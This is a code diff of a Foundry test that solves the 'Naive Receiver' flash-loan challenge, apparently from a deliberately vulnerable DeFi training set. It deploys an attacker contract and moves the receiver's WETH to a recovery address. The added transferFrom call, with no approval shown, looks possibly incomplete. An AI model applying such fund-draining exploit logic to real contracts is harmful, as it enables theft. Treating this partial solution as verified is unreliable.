@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {AttackNaiveReceiver} from "../../src/attacker-contracts/AttackNaiveReceiver.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -16,6 +17,7 @@ contract NaiveReceiverChallenge is Test {
     uint256 constant WETH_IN_POOL = 1000e18;
     uint256 constant WETH_IN_RECEIVER = 10e18;
 
+    AttackNaiveReceiver attacker;
     NaiveReceiverPool pool;
     WETH weth;
     FlashLoanReceiver receiver;
@@ -77,17 +79,9 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        // @audit-info hardhat solution
-        // 10 transactions
-        // const ETH = await pool.WETH();
-        // for(let i = 0; i < 10; i++){
-        //     await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
-        // @audit-info hardhat to foundry
-        for(uint256 i = 0; i <= 10; i++) {
-            NaiveReceiverPool receiverPool = new NaiveReceiverPool(address(pool), payable(weth), deployer);
-            receiverPool.flashLoan(receiver, address(weth), 0, "");
-        }
-
+        // Deploy attacker's contract
+        attacker = new AttackNaiveReceiver(address(pool), address(receiver));
+        weth.transferFrom(address(receiver), address(recovery), WETH_IN_RECEIVER);
     }
 
     /**
